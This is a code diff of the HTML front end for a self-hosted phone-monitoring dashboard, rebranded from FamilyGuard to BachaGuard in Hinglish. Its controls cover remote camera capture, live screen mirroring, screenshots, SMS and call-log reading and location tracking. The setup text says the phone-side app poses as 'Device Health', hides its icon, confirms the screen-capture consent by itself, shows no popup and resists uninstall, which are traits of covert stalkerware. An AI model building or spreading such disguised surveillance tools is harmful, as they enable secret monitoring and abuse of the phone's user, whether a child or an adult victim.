@@ -1,148 +1,245 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<meta name="apple-mobile-web-app-title" content="FamilyGuard">
-<title>FamilyGuard</title>
+<meta name="apple-mobile-web-app-title" content="BachaGuard">
+<meta name="theme-color" content="#16A34A">
+<title>BachaGuard — Bachche ke phone ka control</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
-<link rel="stylesheet" href="style.css?v=4">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%232563EB' d='M12 2 4 5v6c0 5.25 3.4 10.74 8 12 4.6-1.26 8-6.75 8-12V5l-8-3z'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="style.css?v=5">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23DC2626' d='M12 2 4 5v6c0 5.25 3.4 10.74 8 12 4.6-1.26 8-6.75 8-12V5l-8-3z'/%3E%3Ccircle fill='%23F1F5F9' cx='12' cy='10' r='3'/%3E%3Cpath fill='%23F1F5F9' d='M8 16c0-2.2 1.8-4 4-4s4 1.8 4 4v1H8z'/%3E%3C/svg%3E">
 </head>
 <body>
 
 <!-- ============ AUTH ============ -->
 <div id="auth" class="screen">
-  <div class="auth-card">
-    <div class="shield">🛡️</div>
-    <h1>FamilyGuard</h1>
-    <p class="sub">Self-hosted parental control</p>
-    <label>Username</label>
-    <input id="a-user" autocomplete="username" placeholder="parent">
-    <label>Password</label>
-    <input id="a-pass" type="password" autocomplete="current-password" placeholder="••••••">
-    <div class="row">
-      <button id="a-login" class="btn primary">Login</button>
-      <button id="a-reg" class="btn">Register</button>
+  <div class="auth-wrap">
+    <div class="brand">
+      <div class="brand-logo">🛡️</div>
+      <h1>BachaGuard</h1>
+      <p class="tagline">Aapka apna free parental control — sirf aapke parivar ke liye ❤️</p>
     </div>
-    <div id="a-err" class="err"></div>
+
+    <div class="role-tabs">
+      <button id="role-parent" class="role-tab on">👨‍👩‍👧 Main Parent hoon</button>
+      <button id="role-child" class="role-tab">🧒 Main Baccha hoon</button>
+    </div>
+
+    <!-- parent login -->
+    <div id="parent-auth">
+      <div class="auth-card">
+        <h2>Parent Dashboard</h2>
+        <label>Username</label>
+        <input id="a-user" autocomplete="username" placeholder="parent">
+        <label>Password / PIN</label>
+        <input id="a-pass" type="password" autocomplete="current-password" placeholder="••••">
+        <button id="a-login" class="btn primary wide">Dashboard kholo</button>
+        <button id="a-reg" class="btn wide plain">Naya account banayo (Register)</button>
+        <div id="a-err" class="err"></div>
+      </div>
+      <div class="feature-cards">
+        <div class="f-card">
+          <span class="f-ico">⏱</span>
+          <div><b>Screen Time</b><span>Daily limit, bedtime, app block — sab kuch</span></div>
+        </div>
+        <div class="f-card">
+          <span class="f-ico">📍</span>
+          <div><b>Location</b><span>Live location, safe zones, raaste ki history</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- child info -->
+    <div id="child-auth" class="hidden">
+      <div class="auth-card">
+        <h2>Bachche wale phone ke liye</h2>
+        <ol class="steps">
+          <li>Parent login karke <b>Set</b> tab se child app ka <b>link / QR</b> lo</li>
+          <li>Bachche ke phone par link kholo aur app install karo (app ka naam sirf <b>“Device Health”</b> dikhega)</li>
+          <li>App kholkar dashboard ka <b>pairing code</b> daalo — bas ho gaya ✅</li>
+        </ol>
+        <p class="muted small">App icon chhupi rehti hai, popup nahi aata, uninstall bhi parent ke bina possible nahi.</p>
+        <button id="go-parent" class="btn primary wide">Wapas Parent login par jao</button>
+      </div>
+    </div>
+
     <p class="hint">Server: <span id="a-origin"></span></p>
   </div>
 </div>
 
 <!-- ============ APP ============ -->
 <div id="app" class="screen hidden">
-  <header>
-    <div>
-      <h1>FamilyGuard</h1>
-      <div class="child-line">
-        <select id="child-sel"></select>
-        <span id="conn" class="dot off" title="connection"></span>
-      </div>
-    </div>
-    <button id="logout" class="btn small">Logout</button>
+  <header id="hdr">
+    <button id="h-switch" class="h-user" title="Bachcha badlo / add karo">
+      <span id="h-avatar" class="h-av">🧒</span>
+      <span class="h-meta">
+        <span id="h-name">Bachcha select karo</span>
+        <span class="h-sub"><span id="h-sub">—</span><span id="h-live" class="pill off">OFFLINE</span></span>
+      </span>
+      <span class="chev">▾</span>
+    </button>
+    <span id="conn" class="dot off" title="server connection"></span>
   </header>
 
   <main id="main">
-    <!-- HOME -->
-    <section id="tab-home" class="tab">
-      <div class="card" id="status-card">
-        <div class="status-grid">
-          <div><span class="lbl">Status</span><span id="s-online">—</span></div>
-          <div><span class="lbl">Battery</span><span id="s-batt">—</span></div>
-          <div><span class="lbl">Current app</span><span id="s-app" class="small">—</span></div>
-          <div><span class="lbl">Last seen</span><span id="s-seen">—</span></div>
-        </div>
-        <div id="s-health" class="hidden" style="margin-top:10px;padding:10px;border-radius:8px;background:#FEF2F2;color:#B91C1C;font-size:13px"></div>
+    <!-- AAJ -->
+    <section id="tab-aaj" class="tab">
+      <div class="chip-row">
+        <span class="chip" id="s-batt">🔋 —</span>
+        <span class="chip" id="s-app">📱 —</span>
       </div>
+
+      <div id="s-health" class="card red-outline hidden" style="padding:12px 14px;font-size:13px;color:#B91C1C"></div>
+      <div id="adult-card" class="card amber hidden">⚠️ Bachcha 18+ ho gaya — protections khud release ho jayengi aur app khud uninstall ho jayegi.</div>
+
       <div class="card amber hidden" id="offline-card">
         <p class="small" id="offline-text"></p>
-        <div class="row">
-          <button id="offline-remove" class="btn danger small" style="margin-top:0">🗑 Remove device</button>
-        </div>
+        <div class="row"><button id="offline-remove" class="btn danger small" style="margin-top:0">🗑 Remove device</button></div>
       </div>
+
       <div class="card hidden" id="pair-card">
-        <h3>Pair the child device</h3>
-        <p>Open the <b>Device Health</b> app on the child phone (one-time setup) and enter this code:</p>
+        <h3>🔗 Bachche ke device ko pair karo</h3>
+        <p class="small">Bachche ke phone par <b>Device Health</b> app kholkar ye code daalo:</p>
         <div class="code" id="pair-code">—</div>
         <div id="pair-qr" class="hidden" style="text-align:center;margin-top:6px"></div>
         <div class="row">
-          <button id="regen-code" class="btn small">New code</button>
-          <button id="new-child" class="btn small">+ New child</button>
+          <button id="regen-code" class="btn small">🔄 Naya code</button>
+          <button id="new-child" class="btn small">➕ Naya bachcha</button>
         </div>
       </div>
-      <div class="card" id="apk-card">
-        <h3>📱 Child app — install link</h3>
-        <p class="muted small" id="apk-hint">Checking…</p>
-        <input type="file" id="apk-file" accept=".apk,application/vnd.android.package-archive" class="hidden">
-        <div class="row">
-          <button id="apk-sync" class="btn small hidden">🔄 Sync now</button>
-          <button id="apk-upload" class="btn small">⬆ Upload APK</button>
-          <button id="apk-replace" class="btn small hidden">Replace</button>
-          <button id="apk-copy" class="btn small hidden">📋 Copy link</button>
-          <button id="apk-share" class="btn small hidden">Share</button>
-          <button id="apk-delete" class="btn small danger hidden" style="margin-top:0">Remove</button>
+
+      <div class="card st-card">
+        <h3>Aaj ka Screen Time</h3>
+        <div class="st-flex">
+          <div class="ring-wrap">
+            <svg class="ring" viewBox="0 0 120 120">
+              <circle class="ring-bg" cx="60" cy="60" r="52"></circle>
+              <circle class="ring-fg" id="ring-fg" cx="60" cy="60" r="52"></circle>
+            </svg>
+            <div class="ring-center" id="ring-label">—</div>
+          </div>
+          <div class="st-side">
+            <p class="small" id="usage-text">—</p>
+            <span class="badge ok" id="st-badge">App khul sakta hai ✅</span>
+            <div class="st-btns">
+              <button id="bonus15" class="btn small ghost">+15 min</button>
+              <button id="bonus30" class="btn small ghost">+30 min</button>
+            </div>
+          </div>
         </div>
-        <div id="apk-link" class="hidden" style="margin-top:8px;padding:8px;border-radius:8px;background:#0B1220;color:#93C5FD;font-size:12px;word-break:break-all;user-select:all"></div>
-        <div id="apk-qr" class="hidden" style="text-align:center;margin-top:10px"></div>
+        <button id="lock-now" class="btn danger wide">🔒 Lock Now</button>
       </div>
-      <h3>Quick actions</h3>
+
+      <h3 class="sec">Quick actions</h3>
       <div class="grid" id="quick-grid">
-        <button data-cmd="locate_now">📍 Locate now</button>
-        <button data-cmd="ring">🔔 Ring</button>
-        <button data-cmd="lock">🔒 Lock</button>
+        <button data-cmd="locate_now">📍 Location dekho</button>
+        <button data-cmd="ring">🔔 Ring bajao</button>
+        <button data-cmd="lock">🔒 Lock karo</button>
         <button data-cmd="unlock">🔓 Unlock</button>
         <button data-cmd="screenshot">📸 Screenshot</button>
-        <button data-cmd="cam-front">🤳 Camera front</button>
-        <button data-cmd="cam-back">📷 Camera back</button>
+        <button data-cmd="cam-front">🤳 Selfie cam</button>
+        <button data-cmd="cam-back">📷 Back cam</button>
         <button data-cmd="message">💬 Message</button>
-        <button data-cmd="show_app_icon">👁 Show child app icon</button>
-        <button data-cmd="hide_app_icon">🫥 Hide child app icon</button>
+        <button data-cmd="show_app_icon">👁 Icon dikhao</button>
+        <button data-cmd="hide_app_icon">🫥 Icon chupao</button>
       </div>
-      <div id="cmd-status" class="small muted hidden" style="margin:8px 0"></div>
-      <div class="card hidden" id="media-card">
-        <h3>Last capture</h3>
-        <img id="media-img" alt="capture">
-      </div>
-      <div class="card hidden amber" id="adult-card">
-        ⚠️ Child is 18+. Protections will also auto-release on their own — the child app will uninstall itself.
-      </div>
-      <div class="card red-outline" id="danger-card">
-        <h3>Danger zone</h3>
-        <p class="muted small" id="danger-child-name" style="font-weight:700;color:#B91C1C">Device: —</p>
-        <div class="row">
-          <button id="remove-device-btn" class="btn danger" style="margin-top:0">🗑 Remove device</button>
-          <button id="release-btn" class="btn small">Sirf uninstall (record rahega)</button>
-        </div>
-        <p class="muted small"><b>Remove device</b> = child phone se saari permissions (accessibility, device admin, screen sharing) hat kar app uninstall ho jayegi <b>aur ye device dashboard se data samet hamesha ke liye delete</b> ho jayega. <b>Sirf uninstall</b> = app phone se hat jayegi par record rahega (dobara pair kar sakte ho).</p>
+
+      <div class="card act-card">
+        <h3>Activity Log</h3>
+        <p class="muted small">SOS, safe zone entries, notifications — sab yahan</p>
+        <ul id="act-list" class="feed"></ul>
       </div>
     </section>
 
-    <!-- TIME -->
-    <section id="tab-time" class="tab hidden">
+    <!-- LIVE -->
+    <section id="tab-live" class="tab hidden">
       <div class="card">
-        <h3>Today's usage</h3>
-        <div class="bar"><div id="usage-fill"></div></div>
-        <p class="small" id="usage-text">—</p>
-      </div>
-      <div class="card">
-        <h3>Daily screen time limit</h3>
+        <h3>🪞 Live Screen</h3>
         <div class="row">
-          <input id="r-daily" type="number" min="0" max="720" step="15"> <span>min/day (0 = unlimited)</span>
+          <button id="mirror-start" class="btn primary">▶ Mirror shuru karo</button>
+          <button id="mirror-stop" class="btn danger hidden">■ Band karo</button>
+          <span id="mirror-fps" class="muted small"></span>
         </div>
+        <p id="mirror-status" class="small hidden" style="margin:8px 0 0;color:#B45309;background:#FFFBEB;border:1px solid #FCD34D;border-radius:8px;padding:8px"></p>
+        <div id="mirror-wrap"><img id="mirror-img" alt="screen"></div>
+        <p class="muted small">One-time setup: sirf <b>pehli dafa</b> consent aayega (khud confirm ho jata hai). Uske baad seedha screen aayegi — reboot ke baad bhi. Screen aayi par kaali hai? Bachche ka phone screen OFF hoga — ON karte hi frames khud aane lagenge.</p>
+      </div>
+      <div class="card hidden" id="media-card">
+        <h3>📸 Last capture</h3>
+        <img id="media-img" alt="capture">
+      </div>
+    </section>
+
+    <!-- MAP -->
+    <section id="tab-map" class="tab hidden">
+      <div id="map"></div>
+      <div class="card">
+        <h3>📍 Safe zones</h3>
+        <div class="row">
+          <button id="fence-add" class="btn small">➕ Safe zone banao</button>
+          <span id="fence-hint" class="muted small hidden">Ab map par jahan zone chahiye wahan tap karo…</span>
+        </div>
+        <ul id="fence-list" class="chip-list"></ul>
+      </div>
+    </section>
+
+    <!-- REPORT -->
+    <section id="tab-report" class="tab hidden">
+      <div class="card">
+        <h3>📱 Apps & usage</h3>
+        <p class="muted small">App list bachche ke phone se sync hoti hai. Usage = aaj ka.</p>
+        <div id="apps-list"></div>
       </div>
       <div class="card">
-        <h3>Bedtime</h3>
-        <label class="switch-row"><input type="checkbox" id="r-bed-en"> Enabled</label>
+        <h3>☎️ Call log</h3>
+        <ul id="calls-list" class="feed"></ul>
+      </div>
+      <div class="card">
+        <h3>✉️ SMS</h3>
+        <ul id="sms-list" class="feed"></ul>
+      </div>
+    </section>
+
+    <!-- CHAT -->
+    <section id="tab-chat" class="tab hidden">
+      <div class="card">
+        <h3>💬 Bachche ko message bhejo</h3>
+        <label>Title (optional)</label>
+        <input id="chat-title" placeholder="Papa ka message">
+        <label>Message</label>
+        <input id="chat-text" placeholder="Khana kha liya? 🍞">
+        <button id="chat-send" class="btn primary wide">Bhejo 🚀</button>
+        <p class="muted small">Message bachche ke phone par notification ban ke aayega.</p>
+      </div>
+      <div class="card">
+        <h3>Bheje gaye messages</h3>
+        <ul id="chat-list" class="feed"></ul>
+      </div>
+    </section>
+
+    <!-- SET -->
+    <section id="tab-set" class="tab hidden">
+      <div class="card">
+        <h3>🧒 Bachche</h3>
+        <ul id="children-list" class="chip-list"></ul>
+        <button id="new-child-2" class="btn small">➕ Naya bachcha add karo</button>
+      </div>
+
+      <div class="card">
+        <h3>⏱ Screen time rules</h3>
+        <label>Daily limit (min/day, 0 = unlimited)</label>
+        <input id="r-daily" type="number" min="0" max="720" step="15">
+        <label class="switch-row"><input type="checkbox" id="r-bed-en"> 🌙 Bedtime chalu hai</label>
         <div class="row">
           <div><label>From</label><input id="r-bed-start" type="time" value="21:30"></div>
           <div><label>To</label><input id="r-bed-end" type="time" value="07:00"></div>
         </div>
       </div>
       <div class="card">
-        <h3>Blocked apps <span class="muted small">(package name)</span></h3>
+        <h3>🚫 Blocked apps <span class="muted small">(package name)</span></h3>
         <ul id="r-blocked" class="chip-list"></ul>
         <div class="row">
           <input id="r-blocked-in" placeholder="com.instagram.android">
@@ -150,7 +247,7 @@
         </div>
       </div>
       <div class="card">
-        <h3>Per-app daily limits</h3>
+        <h3>⏳ Per-app daily limits</h3>
         <ul id="r-limits" class="chip-list"></ul>
         <div class="row">
           <input id="r-limit-pkg" placeholder="com.google.android.youtube" style="flex:2">
@@ -159,96 +256,61 @@
         </div>
       </div>
       <div class="card">
-        <h3>Always allowed</h3>
+        <h3>✅ Always allowed</h3>
         <ul id="r-allowed" class="chip-list"></ul>
         <div class="row">
           <input id="r-allowed-in" placeholder="com.whatsapp">
           <button id="r-allowed-add" class="btn small">Add</button>
         </div>
       </div>
-      <button id="save-rules" class="btn primary wide">Save & push to child</button>
-    </section>
+      <button id="save-rules" class="btn primary wide">💾 Save karke bachche ko push karo</button>
 
-    <!-- APPS -->
-    <section id="tab-apps" class="tab hidden">
-      <p class="muted small">App list syncs from the child device. Usage = today.</p>
-      <div id="apps-list"></div>
-    </section>
-
-    <!-- MAP -->
-    <section id="tab-map" class="tab hidden">
-      <div id="map"></div>
-      <div class="card">
-        <h3>Geofences</h3>
+      <div class="card" id="apk-card">
+        <h3>📲 Child app — install link</h3>
+        <p class="muted small" id="apk-hint">Checking…</p>
+        <input type="file" id="apk-file" accept=".apk,application/vnd.android.package-archive" class="hidden">
         <div class="row">
-          <button id="fence-add" class="btn small">➕ Add safe zone</button>
-          <span id="fence-hint" class="muted small hidden">Ab map par jahan zone chahiye wahan tap karo…</span>
+          <button id="apk-sync" class="btn small hidden">🔄 Sync now</button>
+          <button id="apk-upload" class="btn small">⬆ Upload APK</button>
+          <button id="apk-replace" class="btn small hidden">Replace</button>
+          <button id="apk-copy" class="btn small hidden">📋 Link copy</button>
+          <button id="apk-share" class="btn small hidden">Share</button>
+          <button id="apk-delete" class="btn small danger hidden" style="margin-top:0">Remove</button>
         </div>
-        <ul id="fence-list" class="chip-list"></ul>
+        <div id="apk-link" class="hidden" style="margin-top:8px;padding:8px;border-radius:8px;background:#0B1220;color:#93C5FD;font-size:12px;word-break:break-all;user-select:all"></div>
+        <div id="apk-qr" class="hidden" style="text-align:center;margin-top:10px"></div>
       </div>
-    </section>
 
-    <!-- MIRROR -->
-    <section id="tab-mirror" class="tab hidden">
-      <div class="row">
-        <button id="mirror-start" class="btn primary">▶ Start mirroring</button>
-        <button id="mirror-stop" class="btn danger hidden">■ Stop</button>
-        <span id="mirror-fps" class="muted small"></span>
-      </div>
-      <p id="mirror-status" class="small hidden" style="margin:8px 0 0;color:#B45309;background:#FFFBEB;border:1px solid #FCD34D;border-radius:8px;padding:8px"></p>
-      <div id="mirror-wrap"><img id="mirror-img" alt="screen"></div>
-      <p class="muted small">One-time setup: sirf <b>pehli dafa</b> consent popup aayega (khud confirm ho jata hai). Uske baad Start dabane par seedha screen aayegi — koi popup nahi, reboot ke baad bhi. Cast icon dikh raha hai par screen nahi aa rahi? Child ka screen OFF hoga — screen off rahi to frames nahi banti, screen on karte hi frames apne aap aane lagte hain.</p>
-    </section>
-
-    <!-- ALERTS -->
-    <section id="tab-alerts" class="tab hidden">
-      <h3>Events</h3>
-      <ul id="events-list" class="feed"></ul>
-      <h3>Notifications from child</h3>
-      <ul id="notifs-list" class="feed"></ul>
-    </section>
-
-    <!-- LOGS -->
-    <section id="tab-logs" class="tab hidden">
-      <h3>Call log</h3>
-      <ul id="calls-list" class="feed"></ul>
-      <h3>SMS</h3>
-      <ul id="sms-list" class="feed"></ul>
-    </section>
-
-    <!-- MORE -->
-    <section id="tab-more" class="tab hidden">
-      <div class="card">
-        <h3>Children</h3>
-        <ul id="children-list" class="chip-list"></ul>
-        <button id="new-child-2" class="btn small">+ Add child</button>
-      </div>
       <div class="card red-outline">
-        <h3>Danger zone</h3>
-        <p class="muted small"><b>Remove device</b> = saari permissions release + uninstall dialog + dashboard record delete (undo nahi hota). <b>Sirf uninstall</b> = app hat jayegi par record rahega. Dono kisi bhi age me kaam karte hain — 18 se pehle bhi, baad me bhi.</p>
+        <h3>⚠️ Danger zone</h3>
+        <p class="muted small" id="danger-child-name" style="font-weight:700;color:#B91C1C">Device: —</p>
         <div class="row">
-          <button id="remove-device-btn-2" class="btn danger" style="margin-top:0">🗑 Remove device</button>
-          <button id="release-btn-2" class="btn small">Sirf uninstall (record rahega)</button>
+          <button id="remove-device-btn" class="btn danger" style="margin-top:0">🗑 Remove device</button>
+          <button id="release-btn" class="btn small">Sirf uninstall (record rahega)</button>
         </div>
+        <p class="muted small"><b>Remove device</b> = bachche ke phone se saari permissions (accessibility, device admin, screen sharing) hat kar app uninstall ho jayegi <b>aur ye device dashboard se data samet hamesha ke liye delete</b> ho jayega. <b>Sirf uninstall</b> = app phone se hat jayegi par record rahega (dobara pair kar sakte ho). Dono kisi bhi age me kaam karte hain.</p>
       </div>
+
       <div class="card">
         <h3>About</h3>
-        <p class="small muted">FamilyGuard v1.0 — private, self-hosted. Personal use only.<br>Server: <span id="about-origin"></span></p>
+        <p class="small muted">BachaGuard v2.0 — private, self-hosted. Sirf personal use ke liye.<br>Server: <span id="about-origin"></span></p>
+        <button id="logout" class="btn wide" style="margin-top:8px">⏻ Logout</button>
       </div>
     </section>
   </main>
 
   <nav id="nav">
-    <button data-tab="home" class="on">🏠<span>Home</span></button>
-    <button data-tab="time">⏳<span>Time</span></button>
-    <button data-tab="apps">📱<span>Apps</span></button>
+    <button data-tab="aaj" class="on">🏠<span>Aaj</span></button>
+    <button data-tab="live">📱<span>Live</span></button>
     <button data-tab="map">🗺️<span>Map</span></button>
-    <button data-tab="mirror">🪞<span>Mirror</span></button>
-    <button data-tab="alerts">🔔<span>Alerts</span></button>
-    <button data-tab="logs">☎️<span>Logs</span></button>
-    <button data-tab="more">⚙️<span>More</span></button>
+    <button data-tab="report">📊<span>Report</span></button>
+    <button data-tab="chat">💬<span>Chat</span></button>
+    <button data-tab="set">⚙️<span>Set</span></button>
   </nav>
 </div>
+
+<!-- toast -->
+<div id="cmd-status" class="hidden"></div>
 
 <!-- dialog -->
 <div id="dlg" class="modal hidden">
@@ -264,6 +326,6 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="vendor/qrcode.js"></script>
-<script src="app.js?v=4"></script>
+<script src="app.js?v=5"></script>
 </body>
 </html>
